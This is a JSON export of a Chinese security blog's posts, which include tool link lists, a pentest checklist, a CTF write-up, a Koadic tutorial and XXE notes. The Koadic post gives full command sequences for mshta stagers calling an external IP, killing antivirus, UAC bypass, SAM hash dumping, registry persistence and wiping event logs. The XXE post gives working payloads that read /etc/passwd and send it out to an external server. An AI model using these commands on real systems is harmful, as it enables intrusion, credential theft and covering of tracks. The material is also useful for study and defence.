{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://zzqsmile.top","root":"/zzqsmile/"},"pages":[{"title":"","date":"2020-08-23T11:49:17.384Z","updated":"2020-08-23T11:49:17.384Z","comments":true,"path":"tags/index.html","permalink":"http://zzqsmile.top/tags/index.html","excerpt":"","text":""},{"title":"About","date":"2020-08-23T10:39:20.240Z","updated":"2020-08-23T10:39:20.240Z","comments":true,"path":"about/index.html","permalink":"http://zzqsmile.top/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2020-08-23T10:39:20.241Z","updated":"2020-08-23T10:39:20.241Z","comments":true,"path":"categories/index.html","permalink":"http://zzqsmile.top/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Hello World","slug":"hello-world","date":"2020-08-19T15:27:43.330Z","updated":"2020-08-19T15:27:43.330Z","comments":true,"path":"2020/08/19/hello-world/","link":"","permalink":"http://zzqsmile.top/2020/08/19/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"实现姓名汉字转成拼音","slug":"python3/姓名汉字转拼音","date":"2019-09-13T01:00:00.000Z","updated":"2019-09-25T09:48:14.000Z","comments":true,"path":"2019/09/13/python3/姓名汉字转拼音/","link":"","permalink":"http://zzqsmile.top/2019/09/13/python3/%E5%A7%93%E5%90%8D%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/","excerpt":"收藏下，汉字转成拼音，以备不时之需。","text":"收藏下，汉字转成拼音，以备不时之需。 eg:张三丰 —&gt; zhangsf吴京 —&gt; wujing 1234567891011121314151617181920from xpinyin import Pinyinwith open(&#39;1.txt&#39;, encoding&#x3D;&#39;utf8&#39;) as fp: # print(fp.read()) word_list &#x3D; fp.readlines()for word in word_list: name &#x3D; word.strip() pin &#x3D; Pinyin() name_list &#x3D; pin.get_pinyin(name).split(&#39;-&#39;) # print(name_list) if len(name_list) &gt; 2: # print(name_list, len(name_list)) name &#x3D; name_list[0] for i in range(len(name_list)-1): name +&#x3D; name_list[i+1][0] else: name &#x3D; &#39;&#39;.join(name_list) print(name)","categories":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/categories/python3/"}],"tags":[{"name":"小工具","slug":"小工具","permalink":"http://zzqsmile.top/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"工具导航","slug":"工具使用/工具导航","date":"2019-08-25T01:00:00.000Z","updated":"2020-08-23T12:00:08.671Z","comments":true,"path":"2019/08/25/工具使用/工具导航/","link":"","permalink":"http://zzqsmile.top/2019/08/25/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E5%AF%BC%E8%88%AA/","excerpt":"实用小工具导航","text":"实用小工具导航 在线猜密码 | 文本去重 | SSL漏洞在线检测工具 网络空间搜索引擎ZoomEye | Shodan | FOFA windowsEverything JBOSS https://github.com/joaomatosf/jexboss SSRF gopher链接生成工具","categories":[{"name":"工具","slug":"工具","permalink":"http://zzqsmile.top/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"传送门","slug":"传送门","permalink":"http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"}]},{"title":"渗透测试流程导航","slug":"渗透测试/渗透测试","date":"2019-08-25T01:00:00.000Z","updated":"2020-08-23T12:03:04.876Z","comments":true,"path":"2019/08/25/渗透测试/渗透测试/","link":"","permalink":"http://zzqsmile.top/2019/08/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"信息收集whois包括但不限于以下信息： 域名服务商 ： 域名拥有者 ： 电 话 ： 邮 箱 ： 地 址 ： kali whois命令 站长之家 爱站工具网 备案 天眼查 真实IP子域名工具 Layer子域名挖掘机 在线 https://phpinfo.me/domain/ IP反查绑定域名网站 搜索引擎枚举 Google hacking 第三方聚合应用枚举 DNSdumpster 证书透明度公开日志枚举 crt.sh censys 端口扫描 nmap 目录后台 御剑 dirsearch 字典：http://github.itzmx.com/juzeon/fire/master/dics_cn.zip dirsearch dirmap Google hacking robots.txt C段 webscan 在线 指纹识别工具 御剑Web指纹识别 WhatWeb WebRobo 椰树 轻量WEB指纹识别 在线CMS识别 BugScaner 云悉指纹 WhatWeb 证书 crt.sh censys github社工 略 网络空间搜索引擎 ZoomEye https://www.zoomeye.org/ Shodan https://www.shodan.io/ FOFA https://fofa.so/ 远程连接中国菜刀 | 中国蚁剑 官方加载器 | Cknife | 冰蝎 | xshell | putty | teamviewer | 向日葵 | 后渗透工具MSF | Koadic |","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://zzqsmile.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"传送门","slug":"传送门","permalink":"http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"}]},{"title":"Koadic使用教程笔记","slug":"工具使用/Koadic使用教程笔记","date":"2019-08-21T01:00:00.000Z","updated":"2020-08-23T12:03:36.760Z","comments":true,"path":"2019/08/21/工具使用/Koadic使用教程笔记/","link":"","permalink":"http://zzqsmile.top/2019/08/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Koadic%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/","excerpt":"记录Koadic使用笔记","text":"记录Koadic使用笔记 安装[root@host ~]# git clone https://github.com/zerosum0x0/koadic.git [root@host ~]# cd koadic/ [root@host koadic]# ./koadic . / \\ _ _ | | | | _____ __ _ __| || | ___ | |/ / _ \\ / _` |/ _` ||.| / __| | / (o) | (_| | (_| ||.|| (__ |_|\\_\\_^_/ \\__,_|\\__,_||:| \\___| |:| ~\\==8==/~ 8 O -&#123; COM Command &amp; Control &#125;- Windows Post-Exploitation Tools Endless Intellect ~[ Version: 0xA ]~ ~[ Stagers: 6 ]~ ~[ Implants: 42 ]~ (koadic: sta/js/mshta)# 注意： 需要python3环境，安装过程如果报错，可能缺少python模块，请使用pip3 install [缺少模块]安装。 使用帮助 help命令查看 (koadic: sta/js/mshta)# help COMMAND DESCRIPTION --------- ------------- api turn off/on the rest api cmdshell command shell to interact with a zombie creds shows collected credentials domain shows collected domain information edit shell out to an editor for the current module exit exits the program help displays help info for a command info shows the current module options jobs shows info about jobs kill kill a job or all jobs listeners shows info about stagers load reloads all modules previous go back to the last used module pyexec evals some python repeatjobs shows info about repeating jobs run runs the current module set sets a variable for the current module sounds turn sounds off/on: sound(0|1) taco taco time unset unsets a variable for the current module use switch to a different module verbose turn verbosity off/on: verbose (0|1) zombies lists hooked targets Use “help command” to find more info about a command. (koadic: sta/js/mshta)# KOADIC模块说明 输入use和空格然后连按两下Tab键查看模块 (koadic: sta/js/mshta)# use [Tab][Tab] implant/ stager/ (koadic: sta/js/mshta)# stager开头的模块是用来反弹主机的，implant开头的模块是用来对反弹的主机进行操作 KOADIC使用Koadic有几个内置模块，“stager/js/mshta”是首次执行该工具时的默认配置模块。你可以通过“info”命令来查看并配置模块。 (koadic: sta/js/mshta)# info NAME VALUE REQ DESCRIPTION ----- ------------ ---- ------------- SRVHOST 107.182.30.95 yes Where the stager should call home SRVPORT 9999 yes The port to listen for stagers on EXPIRES no MM/DD/YYYY to stop calling home KEYPATH no Private key for TLS communications CERTPATH no Certificate for TLS communications MODULE no Module to run once zombie is staged (koadic: sta/js/mshta)# 可以看出，我们必须设置SRVHOST和SRVPORT参数才能使用satger。运行以下命令，用你自己的IP替换IP和端口号，并运行： (koadic: sta/js/mshta)# set SRVHOST 107.182.30.95 [+] SRVHOST =&gt; 107.182.30.95 (koadic: sta/js/mshta)# set SRVPORT 9999 [+] SRVPORT =&gt; 9999 (koadic: sta/js/mshta)# run [+] Spawned a stager at http://107.182.30.95:9999/Dj7wx [!] Don&#39;t edit this URL! (See: &#39;help portfwd&#39;) [&gt;] mshta http://107.182.30.95:9999/Dj7wx (koadic: sta/js/mshta)# 复制日志底部生成的命令并在目标计算机上运行。 一个zombie机器被创建，目标机器现在已连接到了mshta stager server。立即创建僵尸，目标机器现在连接到mshta stager服务器。可以运行以下命令进行确认： (koadic: sta/js/mshta)# zombies 该命令将显示所有的zombie机器，我们可以看到这里只显示了个“Zombie 0”，这是因为它是迄今为止我们唯一创建的一个zombie。 “杀死”防毒软件 下一步是杀死windows defender和所有其他正在运行的防病毒软件，以确保我们可以在目标计算机上执行任何我们想要执行的命令。 命令如下： (koadic: sta/js/mshta)# use implant/manage/killav (koadic: imp/man/killav)# info (koadic: imp/man/killav)# set ZOMBIE 0 (koadic: imp/man/killav)# run 要确认模块是否已成功执行，请运行： (koadic: imp/man/killav)# zombies 0 权限提升使用implant/elevate/bypassuac_compdefaults，命令如下： (koadic: imp/man/killav)# use implant/elevate/bypassuac_compdefaults (koadic: imp/ele/bypassuac_compdefaults)# info (koadic: imp/ele/bypassuac_compdefaults)# listeners (koadic: imp/ele/bypassuac_compdefaults)# set PAYLOAD 0 (koadic: imp/ele/bypassuac_compdefaults)# run 运行以下命令确认模块是否已被成功执行： (koadic: imp/ele/bypassuac_compdefaults)# zombies 使用implant/manage/exec_cmd在CMD上运行任何Windows命令。 命令如下： (koadic: imp/ele/bypassuac_compdefaults)# use implant/manage/exec_cmd (koadic: imp/man/exec_cmd)# info (koadic: imp/man/exec_cmd)# set ZOMBIE 0 (koadic: imp/man/exec_cmd)# run hostname命令在目标机器上执行，将返回机器的名称。 将CMD参数更改为whoami会返回我们正在运行的用户的名称,如下所示。 cmdshell也可以直接进入终端模式下执行命令，如下： (koadic: imp/man/exec_cmd)# cmdshell 0 [koadic: ZOMBIE 0 (192.168.199.193) - C:]&gt; whoami [*] Zombie 0: Job 9 (implant/manage/exec_cmd) created. Result for cd C:\\ &amp; whoami: zzqsmile\\administrator [koadic: ZOMBIE 0 (192.168.199.193) - C:]&gt; INTEL RAID/持久性和数据渗漏 使用implant/gather/hashdump_sam模块，来获取目标计算机上的哈希值。 命令如下： (koadic: imp/man/exec_cmd)# use implant/gather/hashdump_sam (koadic: imp/gat/hashdump_sam)# info (koadic: imp/gat/hashdump_sam)# set GETSYSHIVE true (koadic: imp/gat/hashdump_sam)# run 使用implant/persist/registry模块，运行以下命令： (koadic: imp/gat/hashdump_sam)# use implant/persist/registry (koadic: imp/per/registry)# info (koadic: imp/per/registry)# set PAYLOAD 0 (koadic: imp/per/registry)# set ZOMBIE 0 (koadic: imp/per/registry)# run 使用该模块，我们可以将CLEANUP参数设置为true以删除注册表项，从而隐藏我们的轨迹。 对于刚刚我们获取哈希值的操作，可以运行for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1″命令，使用implant/manage/exec_cmd模块来清除所有事件日志。命令如下： (koadic: imp/per/registry)# use implant/manage/exec_cmd (koadic: imp/man/exec_cmd)# info (koadic: imp/man/exec_cmd)# set ZOMBIE 0 (koadic: imp/man/exec_cmd)# set CMD for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1” (koadic: imp/man/exec_cmd)# run 参考后渗透工具Koadic实战 windows提权辅助工具koadic","categories":[{"name":"工具","slug":"工具","permalink":"http://zzqsmile.top/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Koadic","slug":"Koadic","permalink":"http://zzqsmile.top/tags/Koadic/"}]},{"title":"msf安装使用教程","slug":"工具使用/msf","date":"2019-08-20T01:00:00.000Z","updated":"2019-09-04T08:41:30.000Z","comments":true,"path":"2019/08/20/工具使用/msf/","link":"","permalink":"http://zzqsmile.top/2019/08/20/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/msf/","excerpt":"CentOS安装教程","text":"CentOS安装教程 CentOS6下安装 CentOS7下安装 msf使用教程","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://zzqsmile.top/tags/msf/"}]},{"title":"XXE漏洞笔记","slug":"web安全/XXE","date":"2019-08-19T01:00:00.000Z","updated":"2020-08-23T12:02:53.168Z","comments":true,"path":"2019/08/19/web安全/XXE/","link":"","permalink":"http://zzqsmile.top/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/","excerpt":"好记性不如烂笔头，关于XXE还是要记录下自己的学习过程，以后看起来会更清楚，详细原理不再多讲，简单做个实验记录下笔记以便使用。","text":"好记性不如烂笔头，关于XXE还是要记录下自己的学习过程，以后看起来会更清楚，详细原理不再多讲，简单做个实验记录下笔记以便使用。 实验环境12web服务器：10.12.10.198VPS： 107.182.30.95 实验一：有回显读本地敏感文件(Normal XXE)web服务器放置解析XML的php代码： 示例代码 xml.php 12345678910&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; payload: 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; 结果如下 读取文件种可能会有特殊符号如&amp;,&lt;,&gt;,&quot;,&#39;等会导致读取失败，比如下面读取含有特殊字符文件2.txt失败： 废话不多说，解决办法有两种： 第一种：将读取文件使用base64编码即可 payload: 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; 结果如下 第二种：将读取数据放在CDATA中输出进行绕过 payload: 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///2.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://107.182.30.95/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; 服务器上放置evil.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; 结果如下 注意：读取文件时候要注意文件以及文件夹权限问题，否则会读取失败，记录下遇到的这个坑吧，在这浪费了不少时间，烧脑~ 实验二：无回显读取本地敏感文件(Blind OOB XXE)xml.php 1234567&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;&gt; 此处需要注意，因为实体值中不能有%，故需要将%转成&amp;#37;或者&amp;#x25;，即正确写法如下： 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;&gt; 或者： 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;&gt; payload： 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://107.182.30.95/test.dtd&quot;&gt;%remote;%int;%send;]&gt; 在服务器监听端口，发送payload结果如下： 以上就是XXE基本利用方式总结笔记，当然XXE的危害还有很多，由于时间原因，暂不记录。 参考1 2","categories":[{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"http://zzqsmile.top/tags/XXE/"}]},{"title":"优秀文章汇总","slug":"web安全/优秀文章汇总","date":"2019-06-06T01:00:00.000Z","updated":"2019-09-05T05:58:16.000Z","comments":true,"path":"2019/06/06/web安全/优秀文章汇总/","link":"","permalink":"http://zzqsmile.top/2019/06/06/web%E5%AE%89%E5%85%A8/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%B1%87%E6%80%BB/","excerpt":"优秀文章传送门","text":"优秀文章传送门 XSS 浅谈XSS—字符编码和浏览器解析原理 XSS Bypass List SQL注入 between注入 Sql注入笔记 文件上传 解析漏洞总结 典型漏洞归纳之解析漏洞 典型漏洞归纳之上传漏洞 文件包含代码执行命令执行XXEhttps://xz.aliyun.com/t/3357 CRLF注入 https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html 杂项 常见Web源码泄露总结 Nginx不安全配置可能导致的安全漏洞 未授权访问 未授权访问漏洞总结 综合经验篇 以购物流程挖掘商城漏洞 全程带阻：记一次授权网络攻防演练（上） 全程带阻：记一次授权网络攻防演练（下）","categories":[{"name":"收藏文章","slug":"收藏文章","permalink":"http://zzqsmile.top/categories/%E6%94%B6%E8%97%8F%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"传送门","slug":"传送门","permalink":"http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"}]},{"title":"DDCTF2019部分web题Write Up","slug":"CTF/DDCTF_2019_部分WEB题解","date":"2019-04-18T08:00:00.000Z","updated":"2019-04-18T12:05:38.000Z","comments":true,"path":"2019/04/18/CTF/DDCTF_2019_部分WEB题解/","link":"","permalink":"http://zzqsmile.top/2019/04/18/CTF/DDCTF_2019_%E9%83%A8%E5%88%86WEB%E9%A2%98%E8%A7%A3/","excerpt":"本文主要记录DDCTF2019中部分web赛题的解题过程，仅学习参考使用。","text":"本文主要记录DDCTF2019中部分web赛题的解题过程，仅学习参考使用。 声明：语言表达能力有限，本问仅供学习参考，大佬勿喷！ 滴~ 题目地址 http://117.51.150.246 解题过程 1).首先打开题目，url为http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09，图中出现两个flag.jpg，和一个心情复杂的表情包。看一下源码，发现应该是将文件内容进行base64编码，然后当作图片的内容输出。 2).第一反应是文件包含，jpg参数看不懂。TmpZMlF6WXhOamN5UlRaQk56QTJOdz09，解码看看，通过先进行两次base64解码，再对解码解码进行16进制解码，发现结果为flag.jpg。由此可以知道，文件名需要先进行16进制编码，再进行两次base64编码。 3).尝试读取/etc/passwd，但是好像不能够目录跳转，过滤了/。 4).试一试读取index.php内容，初步猜想，读取源码，进行代码审计。 5).将base64部分解码，得到index.php源码如下。 12345678910111213141516171819202122232425&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);if(! isset($_GET[&#x27;jpg&#x27;])) header(&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;jpg&#x27;])));echo &#x27;&lt;title&gt;&#x27;.$_GET[&#x27;jpg&#x27;].&#x27;&lt;/title&gt;&#x27;;$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);echo $file.&#x27;&lt;/br&gt;&#x27;;$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);echo $file.&#x27;&lt;/br&gt;&#x27;;$txt = base64_encode(file_get_contents($file));echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot;.$txt.&quot;&#x27;&gt;&lt;/img&gt;&quot;;/* * Can you find the flag file? * */?&gt; 6).看来思路没错，接下来看文件代码，发现代码是一些基本的功能输出，并没有解题的线索，唯一吸引注意的是注释部分，发现了一个博客地址。 打开博客，再别人提示下注意到这篇文章，看到这我不得不吐槽一句，出题人脑子有坑吧，线索在博客中就不说了，你倒是直接链接到这篇文章也行啊，坑爹！接下来看看这篇文章，其实没啥看的，就是linux下文件意外退出，会留下一个.swp交换文件。 7).那就是文章中说的这个practice.txt.swp隐藏文件吧。于是继续读取文件源码吧，还是将practice.txt.swp文件通过hex()——&gt;base64()——&gt;base64()顺序编码，然后读取内容。 看到了practice.txt.swp里面内容为f1ag!ddctf.php，到这个地方明显离成功不远了，应该就是继续读取f1ag!ddctf.php文件内容了。 8). 之前在读取index.php文件时候，注意以下代码。 1234$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);echo $file.&#x27;&lt;/br&gt;&#x27;;$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);echo $file.&#x27;&lt;/br&gt;&#x27;; 很明显意思就是文件名在a-zA-Z0-9.中，不能有!，但是下面一行代码是将config字符串替换为!，分析完其实很简单了，要将f1ag!ddctf.php名变成f1agconfigddctf.php就行了。 9).读取f1ag!ddctf.php内容。 12345678910111213141516171819&lt;?phpinclude(&#x27;config.php&#x27;);$k = &#x27;hello&#x27;;extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo&#x27;hello&#x27;; &#125;&#125;?&gt; 10). 审计f1ag!ddctf.php，发现这个出题人可能脑子短路了吧，在这先说结论，php代码中$content=&#39;&#39;，因此我们只需要传入uid=即可拿到flag，因为题目本身就不存在名为hello的文件，或者就是hello文件里面为空，所以file_get_contents($k)的值返回false，然后再经过trim()函数，false被转换成空字符串&quot;&quot;，因此，传入uid等于空即可绕过判断得到flag。注意此处绝对不能想错了误以为file_get_contents($k)会将返回值复制给变量。因此说出题人本来是想考察extract()变量覆盖的，结果弄巧成拙,代码中即使==换成===仍然成立，这样看来这道题最后还变简单了。 假如我将$k值覆盖掉为一个存在的文件名config.php，如下： 看到此处相信都明白我所说的意思了吧，如有疑惑建议亲自动手实践解惑! WEB签到题 题目地址 http://117.51.158.44/index.php 解题过程 1.首先打开题目，如下图所示：抱歉，您没有登陆权限，请获取权限后访问 —– 2.很明显首先要绕过认证才能访问，通过源码信息查看，发现了一个ajax请求，如下所示： 3.发现didictf_username字段可能是一个认证字段，于是走流程抓包发现didictf_username字段，但是不知道名字啊，这个时候就要根据经验了，试试admin吧，果不其然，通过验证，如下所示： 4.通过验证之后显示结果为：您当前当前权限为管理员—-请访问:app/fL2XID2i0Cdh.php 5.下面接着访问app/fL2XID2i0Cdh.php，发现了是两个php文件源码，这就很明显了，接下来就是代码审计，绕过流程，输出flag了。 url:app/Application.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445Class Application &#123; var $path = &#x27;&#x27;; public function response($data, $errMsg = &#x27;success&#x27;) &#123; $ret = [&#x27;errMsg&#x27; =&gt; $errMsg, &#x27;data&#x27; =&gt; $data]; $ret = json_encode($ret); header(&#x27;Content-type: application/json&#x27;); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = &#x27;admin&#x27;; if(!empty($_SERVER[&#x27;HTTP_DIDICTF_USERNAME&#x27;]) &amp;&amp; $_SERVER[&#x27;HTTP_DIDICTF_USERNAME&#x27;] == $DIDICTF_ADMIN) &#123; $this-&gt;response(&#x27;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#x27;); return TRUE; &#125;else&#123; $this-&gt;response(&#x27;抱歉，您没有登陆权限，请获取权限后访问-----&#x27;,&#x27;error&#x27;); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace(&#x27;../&#x27;,&#x27;&#x27;,$path); $path=str_replace(&#x27;..\\\\&#x27;,&#x27;&#x27;,$path); return $path;&#125;public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),&#x27;Congratulations&#x27;); &#125; exit();&#125;&#125; url:app/Session.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112include &#x27;Application.php&#x27;;class Session extends Application &#123; //key建议为8位字符串 var $eancrykey = &#x27;&#x27;; var $cookie_expiration = 7200; var $cookie_name = &#x27;ddctf_id&#x27;; var $cookie_path = &#x27;&#x27;; var $cookie_domain = &#x27;&#x27;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = &#x27;DiDI Welcome you %s&#x27;; $data = sprintf($data,$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]); parent::response($data,&#x27;sucess&#x27;); &#125;else&#123; $this-&gt;session_create(); $data = &#x27;DiDI Welcome you&#x27;; parent::response($data,&#x27;sucess&#x27;); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&#x27;../config/key.txt&#x27;); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(&quot;session not found&quot;,&#x27;error&#x27;); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(&quot;the cookie data not match&quot;,&#x27;error&#x27;); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session[&#x27;session_id&#x27;]) OR !isset($session[&#x27;ip_address&#x27;]) OR !isset($session[&#x27;user_agent&#x27;]))&#123; return FALSE; &#125; if(!empty($_POST[&quot;nickname&quot;])) &#123; $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,&quot;Welcome&quot;); &#125; if($session[&#x27;ip_address&#x27;] != $_SERVER[&#x27;REMOTE_ADDR&#x27;]) &#123; parent::response(&#x27;the ip addree not match&#x27;.&#x27;error&#x27;); return FALSE; &#125; if($session[&#x27;user_agent&#x27;] != $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]) &#123; parent::response(&#x27;the user agent not match&#x27;,&#x27;error&#x27;); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = &#x27;&#x27;; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( &#x27;session_id&#x27; =&gt; md5(uniqid($sessionid,TRUE)), &#x27;ip_address&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;], &#x27;user_agent&#x27; =&gt; $_SERVER[&#x27;HTTP_USER_AGENT&#x27;], &#x27;user_data&#x27; =&gt; &#x27;&#x27;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125;$ddctf = new Session();$ddctf-&gt;index(); 分析这两个php文件，仅仅两个类而已，不过本人太菜，分析了1天，第一个文件app/Application.php定义了一个Application类；第二个文件app/Session.php也是一个类，不过这个Session类是继承于Application类，然后最后定义一个对象ddctf,这个对象调用index()函数。大概过程就是这样，比较简单。主要就是里面的东西。接下来稍微具体的分析下两个文件里面功能设计。 第一个文件：首先是定义了一个$path；然后是response()函数，这个函数主要是输出信息的，接着是auth()认证函数，这个就是控制访问权限的，可以看到要想通过认证，必须使$_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]等于admin,即HTTP头部字段didictf_username为admin；接下来是sanitizepath()函数，这个函数是对变量path的字符串的过滤，这个地方随后会用的到，开始没想到这个地方；接下来就是类中的析构函数__destruct，可以看到，如果path变量为空，就会退出，path变量长度不是18位也会退出，最后是读取path路径的文件内容并使用response()输出。 第二个文件：继承于上个文件中的类，之前说过，里面开始定义了一些类中变量；下面第一个函数为index()函数，这个文件在这里面也是相当于一个主函数了，里面主要调用的是session_read()和session_create()两个函数，同时还使用parent关键字调用使用父类中的response()函数；还有一个get_key()函数，功能是相当于读取../config/key.txt中8位的密钥吧，之前也有提示下面会用到，不过此处有个提示//eancrykey and flag under the folder,提示说的是flag也在这个文件夹下。 具体还是说一下session_read()和session_create()两个函数，在index()函数里面，如果请求包里面没有设置cookie就会启用session_create()函数，反之，设置有cookie,就会调用session_create()函数。session_create()函数是创建cookie的函数，里面没什么要说的；session_read()函数是读取cookie，通过分析可以知道，如果我们知道key就可以任意构造cookie了，关键是如何将key值输出。关键代码如下： 